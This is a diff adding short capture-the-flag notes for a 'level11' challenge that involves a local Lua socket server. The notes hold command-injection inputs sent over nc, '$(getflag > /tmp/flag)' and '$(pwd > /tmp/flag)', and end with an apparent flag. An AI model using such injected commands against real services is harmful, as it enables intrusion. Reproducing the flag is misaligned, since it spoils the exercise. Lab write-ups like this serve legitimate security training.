@@ -1,0 +1,22 @@
+⬇️ cat level11.lua
+⬇️ la -la /tmp/level11.lua
+⬇️ ps -aux | grep level11
+👉 lua /home/user/level11/level11.lua
+
+⬇️ cp level11.lua /tmp
+⬇️ change line in /tmplevel11.lua 👉 local server = assert(socket.bind("127.0.0.1", 5251))
+
+⬇️ lua /tmp/level11.lua > /tmp/output &
+⬇️ curl http://127.0.0.1:5251/word
+⬇️ cat /tmp/output 👉 trying GET /word HTTP/1.1
+
+⬇️ nc localhost 5251
+⬇️ $(pwd > /tmp/flag)
+⬇️ cat /tmp/flag
+
+
+🔻 Hack
+⬇️ nc localhost 5151
+⬇️ $(getflag > /tmp/flag)
+⬇️ rm /tmp/flag
+👉 fa6v5ateaw21peobuub8ipe6s
